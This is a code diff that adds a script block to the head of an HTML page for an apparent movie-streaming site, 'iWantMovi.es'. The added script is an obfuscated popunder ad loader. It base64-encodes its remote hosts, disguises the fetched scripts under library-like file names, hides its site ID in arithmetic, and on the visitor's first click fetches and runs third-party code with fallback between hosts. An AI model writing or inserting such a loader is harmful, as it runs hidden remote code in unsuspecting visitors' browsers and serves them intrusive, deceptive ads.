@@ -26,6 +26,68 @@
       margin-top: 20px;
     }
   </style>
+  
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function() {
+  var i = window,
+      v = "cdd2d12e73a68d281cdb9ba21fc14f7c",
+      e = [
+        ["siteId", 454 * 662 + 256 * 490 * 839 - 100333933],
+        ["minBid", 0],
+        ["popundersPerIP", "1"],       // Limit per IP to avoid spam
+        ["delayBetween", 60],          // 60 seconds between pops
+        ["default", false],
+        ["defaultPerDay", 3],          // Up to 3 per day
+        ["topmostLayer", "always"]
+      ],
+      w = [
+        "d3d3LmludGVsbGlnZW5jZWFkeC5jb20vZXNpbXBsZS1nYWxsZXJ5Lm1pbi5jc3M=",
+        "ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvVHlCSURBL2FyZWFjdC1qc29uLXRyZWUubWluLmpz"
+      ],
+      j = -1,
+      s, m;
+
+  var q = function() {
+    clearTimeout(m);
+    j++;
+    if (w[j] && !(1776588386000 < (new Date).getTime() && 1 < j)) {
+      s = i.document.createElement("script");
+      s.type = "text/javascript";
+      s.async = true;
+      var k = i.document.getElementsByTagName("script")[0];
+      s.src = "https://" + atob(w[j]);
+      s.crossOrigin = "anonymous";
+      s.onerror = q;
+      s.onload = function() {
+        clearTimeout(m);
+        i[v.slice(0, 16) + v.slice(0, 16)] || q()
+      };
+      m = setTimeout(q, 5000);
+      k.parentNode.insertBefore(s, k)
+    }
+  };
+
+  var initPopAd = function() {
+    if (!i[v]) {
+      try {
+        Object.freeze(i[v] = e)
+      } catch (e) {}
+      q();
+    }
+  };
+
+  // 👇 Trigger only once on first click
+  var triggered = false;
+  document.addEventListener("click", function () {
+    if (!triggered) {
+      triggered = true;
+      initPopAd();
+    }
+  });
+})();
+/*]]>/* */
+</script>
 </head>
 <body>
   <h1>🎬 Watch iWantMovi.es</h1>
